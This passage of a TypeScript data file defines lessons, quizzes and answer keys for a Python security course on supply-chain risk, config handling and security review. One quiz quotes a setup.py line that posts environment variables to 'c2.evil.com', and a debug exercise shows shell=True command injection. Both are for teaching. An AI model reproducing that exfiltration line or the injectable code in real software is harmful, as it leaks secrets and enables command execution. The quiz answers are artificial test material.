          id: "s38-dep-risk-mc2",
          kind: "multiple-choice",
          prompt: "What does pinning a dependency version mean?",
          beginnerPurpose: "Understand version pinning",
          expectedConceptIds: ["security-trust-boundaries"],
          options: [
            { id: "a", text: "Installing the latest version automatically", isCorrect: false, explanation: "Latest version changes over time — that is the opposite of pinning." },
            { id: "b", text: "Specifying an exact version so the same version is always installed", isCorrect: true, explanation: "Correct! Pinning (requests==2.31.0) ensures every install gets exactly that version." },
            { id: "c", text: "Preventing the package from being upgraded", isCorrect: false, explanation: "Pinning specifies the exact version; you can still upgrade by changing the pin." },
            { id: "d", text: "Marking a dependency as optional", isCorrect: false, explanation: "Optional dependencies are a different concept from version pinning." },
          ],
          allowMultiple: false,
          allowedAttempts: 2,
          hints: [{ level: "concept", text: "Think about requests==2.31.0 vs requests>=2.0." }],
          feedback: {
            correct: "Correct! Pinning specifies the exact version to install.",
            incorrect: "Pinning means using == to specify the exact version, e.g., requests==2.31.0.",
          },
        },
      ],
      reviewHooks: [
        { conceptId: "security-trust-boundaries", recallPrompt: "What tool can you run to check your dependencies for known CVEs?", nextReviewAfterDays: 5 },
      ],
      masteryCriteria: {
        requiredInteractionIds: ["s38-dep-risk-mc", "s38-dep-risk-mc2"],
        minimumCorrectFraction: 0.8,
        reviewHookIds: [],
      },
    },

    // ── 38.16 Supply-Chain Risk ────────────────────────────────────────────
    {
      id: "s38-supply-chain-risk",
      stageId: "stage-38",
      title: "Supply-Chain Risk",
      kind: "concept",
      difficulty: "advanced",
      objectives: [
        "Explain what a supply-chain attack is in the Python ecosystem",
        "Identify red flags when evaluating a package for use",
        "Apply due-diligence steps before adding a new dependency",
      ],
      prerequisites: ["s38-dependency-risk"],
      concepts: ["security-trust-boundaries"],
      contentBlocks: [
        {
          kind: "text",
          markdown:
            "## Supply-Chain Risk\n\nA **supply-chain attack** compromises a dependency to deliver malicious code to users of that dependency. Famous examples:\n\n- **event-stream (npm)** — a new maintainer added crypto-mining code\n- **PyPI typosquatting** — `crypt0`, `requessts`, `pyyam1` — names that look like popular packages\n- **Malicious uploads** — attackers gained upload credentials and pushed backdoored releases\n\nPython-specific risks:\n- `setup.py` runs during `pip install` — a malicious setup.py executes immediately\n- `__import__` side effects during package import",
        },
        {
          kind: "text",
          markdown:
            "### Due Diligence Checklist\n\nBefore adding a new dependency:\n1. **Is it well-maintained?** Check last commit, open issues, maintainer count\n2. **Is the name exactly right?** Verify package name on PyPI\n3. **How many downloads?** Typosquatted packages have near-zero downloads\n4. **Does it have a security policy?** SECURITY.md or equivalent\n5. **Is it necessary?** Could stdlib or an already-used package do the job?\n6. **Review the source** for unusual network calls or file access in setup.py",
        },
        {
          kind: "callout",
          variant: "warning",
          title: "setup.py runs code during installation",
          body: "pip install executes setup.py (and pyproject build hooks). A malicious package can exfiltrate environment variables, SSH keys, or credentials during installation — before you review the code.",
        },
        {
          kind: "why-matters",
          body: "Supply-chain attacks have compromised thousands of downstream projects. A single malicious dependency can exfiltrate all your environment variables (including secrets) at install time. Minimal dependencies and due diligence are the only defenses.",
        },
      ],
      interactions: [
        {
          id: "s38-supply-chain-mc",
          kind: "multiple-choice",
          prompt: "A setup.py in a package you're installing contains: `import requests; requests.post('https://c2.evil.com', data=os.environ)`. When does this code run?",
          beginnerPurpose: "Understand when setup.py executes",
          expectedConceptIds: ["security-trust-boundaries"],
          options: [
            { id: "a", text: "Only when you import the package in your code", isCorrect: false, explanation: "setup.py runs during pip install, not during import." },
            { id: "b", text: "During pip install — before you review any code", isCorrect: true, explanation: "Correct! pip executes setup.py as part of the installation process — this is why malicious setup.py scripts can exfiltrate secrets immediately." },
            { id: "c", text: "Never — pip doesn't execute setup.py", isCorrect: false, explanation: "pip does execute setup.py for source distributions." },
            { id: "d", text: "Only in a virtual environment", isCorrect: false, explanation: "setup.py runs regardless of whether you're in a virtual environment." },
          ],
          allowMultiple: false,
          allowedAttempts: 2,
          hints: [{ level: "concept", text: "When does pip build/install a package? What does it run first?" }],
          feedback: {
            correct: "Correct! setup.py executes during pip install — that's why malicious packages can steal secrets at install time.",
            incorrect: "setup.py runs during pip install, before you ever import the package.",
          },
        },
        {
          id: "s38-supply-chain-explain",
          kind: "plain-language-explain",
          prompt: "Explain two due-diligence steps you should take before installing a new Python package.",
          beginnerPurpose: "Apply supply-chain risk mitigation",
          expectedConceptIds: ["security-trust-boundaries"],
          code: `# Which is more suspicious?
# Package A: 50M monthly downloads, 200 GitHub stars, last commit 2 weeks ago
# Package B: 3 downloads, 0 stars, created yesterday`,
          keyPointsToHit: [
            "Verify the exact package name to avoid typosquatting",
            "Check download count and recent activity",
            "Review setup.py or pyproject build hooks for suspicious code",
          ],
          sampleAnswer: "First, verify the exact package name on PyPI — typosquatted packages look nearly identical. Check the download count; a legitimate popular package has millions of downloads while a fake has near zero. Second, review setup.py for any network calls or file access before installing.",
          allowedAttempts: 2,
          hints: [{ level: "concept", text: "Think about name verification and code review before installation." }],
          feedback: {
            correct: "Good due diligence steps! These would catch most supply-chain attacks.",
            incorrect: "Focus on: (1) exact name verification, (2) download/activity check, (3) setup.py review.",
          },
        },
      ],
      reviewHooks: [
        { conceptId: "security-trust-boundaries", recallPrompt: "Name two signs that a PyPI package might be a supply-chain attack.", nextReviewAfterDays: 5 },
      ],
      masteryCriteria: {
        requiredInteractionIds: ["s38-supply-chain-mc", "s38-supply-chain-explain"],
        minimumCorrectFraction: 0.8,
        reviewHookIds: [],
      },
    },

    // ── 38.17 Secure Config Handling ──────────────────────────────────────
    {
      id: "s38-secure-config",
      stageId: "stage-38",
      title: "Secure Config Handling",
      kind: "concept",
      difficulty: "advanced",
      objectives: [
        "Separate configuration from code",
        "Distinguish between non-secret config (env vars OK) and secrets (vault/secret manager required)",
        "Validate configuration values at startup",
      ],
      prerequisites: ["s38-secrets-env-vars"],
      concepts: ["security-trust-boundaries"],
      contentBlocks: [
        {
          kind: "text",
          markdown:
            "## Secure Config Handling\n\nConfiguration management has two layers:\n\n1. **Non-secret config** (database host, log level, feature flags) → environment variables or config files in VCS\n2. **Secrets** (passwords, API keys, TLS private keys) → secrets manager (AWS Secrets Manager, HashiCorp Vault, Kubernetes Secrets)\n\nPrinciples:\n- Fail fast: validate all config at startup, not when first used\n- Least privilege: only load secrets the current service actually needs\n- Rotate: all secrets should be rotatable without code changes",
        },
        {
          kind: "code",
          language: "python",
          code: `import os
from dataclasses import dataclass

@dataclass(frozen=True)
class AppConfig:
    db_host: str
    db_port: int
    db_password: str
    log_level: str

    @classmethod
    def from_env(cls) -> "AppConfig":
        return cls(
            db_host=os.environ.get("DB_HOST", "localhost"),
            db_port=int(os.environ.get("DB_PORT", "5432")),
            db_password=_require_env("DB_PASSWORD"),
            log_level=os.environ.get("LOG_LEVEL", "INFO"),
        )

def _require_env(name: str) -> str:
    val = os.environ.get(name)
    if not val:
        raise EnvironmentError(f"Required env var {name!r} not set")
    return val

# At startup, before serving any requests:
config = AppConfig.from_env()  # fails early if secrets missing`,
          caption: "Load and validate all config at startup with a config dataclass",
        },
        {
          kind: "why-matters",
          body: "Applications that validate config at startup fail loudly and immediately rather than failing silently when the first request hits a code path that uses a missing secret. This reduces debugging time and prevents partial-availability incidents.",
        },
      ],
      interactions: [
        {
          id: "s38-secure-config-mc",
          kind: "multiple-choice",
          prompt: "Why should you validate all configuration values at application startup rather than lazily when first used?",
          beginnerPurpose: "Understand fail-fast config validation",
          expectedConceptIds: ["security-trust-boundaries"],
          options: [
            { id: "a", text: "Startup validation uses less memory", isCorrect: false, explanation: "Memory use is not the reason — fail-fast behavior is." },
            { id: "b", text: "Startup validation catches missing or invalid config before the app serves any traffic", isCorrect: true, explanation: "Correct! Failing at startup gives a clear error immediately rather than a cryptic failure during a user request." },
            { id: "c", text: "Lazy validation is only safe in development", isCorrect: false, explanation: "Lazy validation is problematic in both development and production." },
            { id: "d", text: "Config cannot be read from environment variables lazily", isCorrect: false, explanation: "env vars can be read any time — the question is whether to validate eagerly or lazily." },
          ],
          allowMultiple: false,
          allowedAttempts: 2,
          hints: [{ level: "concept", text: "When would you rather discover a missing DB_PASSWORD — at startup or mid-request?" }],
          feedback: {
            correct: "Correct! Fail-fast at startup means clear, immediate errors rather than cryptic failures in production traffic.",
            incorrect: "Startup validation fails immediately with a clear message. Lazy validation can fail on the first user request.",
          },
        },
        {
          id: "s38-secure-config-fill",
          kind: "fill-code",
          prompt: "Implement _require_env that raises EnvironmentError for missing variables.",
          beginnerPurpose: "Practice required env var reading",
          expectedConceptIds: ["security-trust-boundaries"],
          codeTemplate: `import os
def _require_env(name: str) -> str:
    val = os.environ.___(name)
    if not val:
        raise EnvironmentError(f"{name!r} is required")
    return val`,
          blanks: [
            { placeholder: "___", answer: "get", caseSensitive: true },
          ],
          allowedAttempts: 3,
          hints: [{ level: "syntax", text: "os.environ.get(name) returns None if not set; os.environ[name] raises KeyError." }],
          feedback: {
            correct: "Correct! os.environ.get() returns None for missing vars, letting you raise a clear error.",
            incorrect: "os.environ.get(name) returns None if missing, then you can raise EnvironmentError.",
          },
        },
      ],
      reviewHooks: [
        { conceptId: "security-trust-boundaries", recallPrompt: "What is the fail-fast principle for application configuration?", nextReviewAfterDays: 4 },
      ],
      masteryCriteria: {
        requiredInteractionIds: ["s38-secure-config-mc", "s38-secure-config-fill"],
        minimumCorrectFraction: 0.8,
        reviewHookIds: [],
      },
    },

    // ── 38.18 Security Review Checklist ──────────────────────────────────
    {
      id: "s38-security-checklist",
      stageId: "stage-38",
      title: "Security Review Checklist",
      kind: "review",
      difficulty: "advanced",
      objectives: [
        "Apply a structured checklist when reviewing Python code for security issues",
        "Identify the most common Python-specific security anti-patterns",
        "Prioritize security findings by severity",
      ],
      prerequisites: [
        "s38-input-validation",
        "s38-output-escaping",
        "s38-safe-file-paths",
        "s38-safe-subprocess",
        "s38-safe-deserialization",
        "s38-secrets-env-vars",
      ],
      concepts: ["security-trust-boundaries", "cryptography"],
      contentBlocks: [
        {
          kind: "text",
          markdown:
            "## Security Review Checklist\n\n### Critical (must fix before deploy)\n- [ ] No `pickle.loads`, `yaml.load`, or `eval` on untrusted data\n- [ ] No `shell=True` with user-controlled data in subprocess\n- [ ] No hardcoded secrets (passwords, API keys, tokens)\n- [ ] No SQL string interpolation (use parameterized queries)\n- [ ] Path inputs validated with resolve + containment check\n\n### High\n- [ ] Secrets read from environment, not config files in VCS\n- [ ] SSL certificate verification not disabled\n- [ ] Tokens generated with `secrets` module, not `random`\n- [ ] User inputs validated (type, length, format, allowlist)\n- [ ] HTML output escaped with `html.escape` or template engine\n\n### Medium\n- [ ] Dependencies pinned and audited with `pip-audit`\n- [ ] Passwords read with `getpass`, not `input`\n- [ ] Logging does not emit secrets or PII\n- [ ] Error messages do not leak stack traces to users\n- [ ] Config validated at startup",
        },
        {
          kind: "callout",
          variant: "tip",
          title: "Use static analysis to automate the checklist",
          body: "Bandit (`pip install bandit`) scans Python code for common security issues automatically. Run it in CI: `bandit -r src/`. It catches many checklist items without manual review.",
        },
        {
          kind: "why-matters",
          body: "A structured checklist ensures security review is systematic rather than ad-hoc. Professional security reviews use exactly this kind of checklist, adapted to the tech stack.",
        },
      ],
      interactions: [
        {
          id: "s38-checklist-mc",
          kind: "multiple-choice",
          prompt: "During a code review you find: `subprocess.run(f'grep {search_term} access.log', shell=True)` where search_term comes from a web form. This is which severity?",
          beginnerPurpose: "Apply the severity framework to a real finding",
          expectedConceptIds: ["security-trust-boundaries"],
          options: [
            { id: "a", text: "Low — shell commands are restricted", isCorrect: false, explanation: "This is critical — user input flows directly into a shell command." },
            { id: "b", text: "Medium — depends on the web framework", isCorrect: false, explanation: "The framework does not affect shell injection severity." },
            { id: "c", text: "Critical — direct command injection via shell=True and user data", isCorrect: true, explanation: "Correct! shell=True with user data is always critical — command injection allows arbitrary code execution." },
            { id: "d", text: "High — only if the server is internet-facing", isCorrect: false, explanation: "Command injection is critical regardless of exposure — internal attackers exist too." },
          ],
          allowMultiple: false,
          allowedAttempts: 2,
          hints: [{ level: "concept", text: "Check the checklist: what category does shell=True with user data fall under?" }],
          feedback: {
            correct: "Correct! shell=True + user data is on the Critical list — must fix before deploy.",
            incorrect: "shell=True with user-controlled data is a critical command injection vulnerability.",
          },
        },
        {
          id: "s38-checklist-debug",
          kind: "debug-code",
          prompt: "Find and fix the security vulnerability in this code.",
          beginnerPurpose: "Apply security review skills to fix a real vulnerability",
          expectedConceptIds: ["security-trust-boundaries"],
          brokenCode: `import subprocess
def convert_file(user_filename: str) -> bytes:
    result = subprocess.run(
        f"convert {user_filename} output.png",
        shell=True,
        capture_output=True
    )
    return result.stdout`,
          bugDescription: "shell=True with user input allows command injection",
          fixedCode: `import subprocess
def convert_file(user_filename: str) -> bytes:
    result = subprocess.run(
        ["convert", user_filename, "output.png"],
        shell=False,
        capture_output=True
    )
    return result.stdout`,
          errorType: "SecurityVulnerability",
          allowedAttempts: 4,
          hints: [
            { level: "concept", text: "Replace the f-string command with a list and remove shell=True." },
            { level: "syntax", text: "subprocess.run(['convert', filename, 'output.png'], capture_output=True)" },
          ],
          feedback: {
            correct: "Correct! List form + shell=False prevents command injection.",
            incorrect: "Pass a list ['convert', user_filename, 'output.png'] and remove shell=True.",
          },
        },
      ],
      reviewHooks: [
        { conceptId: "security-trust-boundaries", recallPrompt: "Name three Critical-severity security issues from the review checklist.", nextReviewAfterDays: 3 },
      ],
      masteryCriteria: {
        requiredInteractionIds: ["s38-checklist-mc", "s38-checklist-debug"],
        minimumCorrectFraction: 0.8,
        reviewHookIds: [],
      },
    },

    // ── 38.19 Secure CLI Project ──────────────────────────────────────────
    {
      id: "s38-secure-cli-project",
      stageId: "stage-38",
      title: "Secure CLI Project",
      kind: "project",
      difficulty: "advanced",
      objectives: [
        "Build a CLI tool that applies all security best practices from this stage",
        "Read secrets from environment, hash passwords with PBKDF2, sign data with HMAC",
        "Validate all inputs and produce safe output",
      ],
      prerequisites: [
        "s38-security-checklist",
        "s38-hmac",
        "s38-hashlib",
        "s38-secrets-module",
      ],
      concepts: ["security-trust-boundaries", "cryptography"],
      contentBlocks: [
        {
          kind: "text",
          markdown:
            "## Secure CLI Project\n\nBuild a secure file-signing CLI that:\n1. Reads a signing key from environment (never CLI arg)\n2. Validates all file path inputs (no path traversal)\n3. Computes SHA-256 of files and signs them with HMAC-SHA256\n4. Writes a manifest.json with signed hashes\n5. Can verify a manifest against current files",
        },
        {
          kind: "code",
          language: "python",
          code: `#!/usr/bin/env python
import argparse, hashlib, hmac, json, os
from pathlib import Path

def get_key() -> bytes:
    val = os.environ.get("SIGNING_KEY")
    if not val:
        raise EnvironmentError("SIGNING_KEY environment variable required")
    return val.encode()

def hash_file(path: Path) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()

def sign_entry(key: bytes, path: str, digest: str) -> str:
    msg = f"{path}:{digest}".encode()
    return hmac.new(key, msg, hashlib.sha256).hexdigest()

def verify_entry(key: bytes, path: str, digest: str, sig: str) -> bool:
    expected = sign_entry(key, path, digest)
    return hmac.compare_digest(expected, sig)`,
          caption: "Reference skeleton for the secure file-signing CLI",
        },
        {
          kind: "why-matters",
          body: "File signing with HMAC is a fundamental security primitive used in software distribution, CI/CD artifact verification, and audit trail systems. This project combines every security concept from the stage into a real tool.",
        },
      ],
      interactions: [
        {
          id: "s38-secure-cli-mc",
          kind: "multiple-choice",
          prompt: "Why should the signing key be read from an environment variable rather than passed as a CLI argument?",
          beginnerPurpose: "Apply secret management principles",
          expectedConceptIds: ["security-trust-boundaries"],
          options: [
            { id: "a", text: "CLI arguments are slower to read than env vars", isCorrect: false, explanation: "Performance is not the reason." },
            { id: "b", text: "CLI arguments appear in process lists (ps aux) and shell history, exposing the key", isCorrect: true, explanation: "Correct! Arguments to processes are visible in /proc and shell history — a major secret exposure risk." },
            { id: "c", text: "Python cannot parse CLI arguments", isCorrect: false, explanation: "argparse handles CLI arguments — that's not the issue." },
            { id: "d", text: "Environment variables are encrypted by the OS", isCorrect: false, explanation: "Environment variables are not encrypted, but they do not appear in process lists or shell history." },
          ],
          allowMultiple: false,
          allowedAttempts: 2,
          hints: [{ level: "concept", text: "Run 'ps aux' on any Linux system — what do you see in the COMMAND column?" }],
          feedback: {
            correct: "Correct! CLI args appear in process listings and bash history — never pass secrets as args.",
            incorrect: "CLI args are visible in ps aux and ~/.bash_history. Environment variables are not.",
          },
        },
        {
          id: "s38-secure-cli-run",
          kind: "run-code",
          prompt: "Write a function that takes key bytes and a message bytes, returns HMAC-SHA256 hex digest, and verifies it using compare_digest.",
          beginnerPurpose: "Implement and verify HMAC signing",
          expectedConceptIds: ["cryptography"],
          starterCode: `import hmac, hashlib

def sign(key: bytes, message: bytes) -> str:
    # TODO: return HMAC-SHA256 hex digest
    pass

def verify(key: bytes, message: bytes, sig: str) -> bool:
    # TODO: verify using compare_digest
    pass

key = b"test_key_32_bytes_padded_______x"
msg = b"hello world"
s = sign(key, msg)
print(s)
print(verify(key, msg, s))          # True
print(verify(key, b"tampered", s))  # False
`,
          task: "Implement sign() and verify() using hmac.new and hmac.compare_digest.",
          expectedOutputContains: ["True", "False"],
          pyodideCompatible: true,
          allowedAttempts: 10,
          hints: [
            { level: "syntax", text: "hmac.new(key, msg, hashlib.sha256).hexdigest() for signing." },
            { level: "syntax", text: "hmac.compare_digest(expected, sig) for verification." },
          ],
          feedback: {
            correct: "Correct! You implemented HMAC signing and constant-time verification.",
            incorrect: "sign: hmac.new(key, msg, hashlib.sha256).hexdigest(). verify: compare sign(key,msg) with hmac.compare_digest.",
          },
        },
      ],
      reviewHooks: [
        { conceptId: "cryptography", recallPrompt: "Name three security best practices for a CLI tool that handles secrets.", nextReviewAfterDays: 4 },
      ],
      masteryCriteria: {
        requiredInteractionIds: ["s38-secure-cli-mc", "s38-secure-cli-run"],
        minimumCorrectFraction: 0.8,
        reviewHookIds: [],
      },
    },
  ],
  project: {
    id: "s38-project",
    stageId: "stage-38",
    title: "Secure CLI Application",
    brief:
      "Audit and harden an existing Python CLI application against common security vulnerabilities: command injection, path traversal, insecure deserialization, hardcoded secrets, and weak randomness.",
    requirements: [
      "Replace all shell=True subprocess calls with list form",
      "Add path traversal protection for all file inputs",
      "Replace pickle deserialization with JSON for any untrusted data",
      "Move all hardcoded secrets to environment variables",
      "Replace random with secrets for all token/ID generation",
      "Add HTML output escaping for any user data in HTML output",
      "Validate all CLI inputs (type, length, allowlist where appropriate)",
      "Add type annotations to all public functions",
    ],
    acceptanceCriteria: [
      "No shell=True with user-controlled data",
      "All file paths validated with resolve + containment check",
      "No pickle.loads on untrusted data",
      "No hardcoded secrets — all from os.environ",
      "Tokens generated with secrets module",
      "pip-audit reports no high/critical CVEs in dependencies",
      "All public functions have type annotations",
    ],
    conceptIds: ["security-trust-boundaries", "cryptography"],
    difficulty: "advanced",
  },
} satisfies Stage;
